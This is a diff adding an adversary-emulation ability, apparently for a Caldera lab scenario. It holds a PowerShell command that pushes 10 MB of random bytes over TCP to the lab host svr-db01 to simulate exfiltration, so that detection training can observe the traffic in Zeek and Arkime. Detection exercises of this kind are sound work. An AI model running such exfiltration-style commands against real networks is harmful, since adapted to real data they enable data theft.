@@ -1,0 +1,29 @@
+---
+
+- id: 4a100016-cafe-4001-8001-c0ffee000016
+  name: Data exfiltration to svr-db01 with high byte volume (L8 Sc.2 step 3)
+  description: Send a large TCP payload to svr-db01 to simulate exfil — the resulting connection produces the byte-volume spike visible in Zeek conn.log and Arkime sessions
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    windows:
+      psh:
+        command: |
+          $targetHost = "svr-db01";
+          $targetPort = 1433;
+          $dataSize   = 10 * 1024 * 1024;
+          $data       = New-Object byte[] $dataSize;
+          [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data);
+          try {
+            $tcp = New-Object System.Net.Sockets.TcpClient;
+            $tcp.Connect($targetHost, $targetPort);
+            $stream = $tcp.GetStream();
+            $stream.Write($data, 0, $data.Length);
+            $stream.Flush();
+            $tcp.Close();
+            Write-Host "[L8sc2-3] Exfiltrated $(($dataSize/1MB)) MB to ${targetHost}:${targetPort}"
+          } catch {
+            Write-Host "[L8sc2-3] Exfil attempt to ${targetHost}:${targetPort} (connection may have been refused — still visible in Zeek)"
+          }
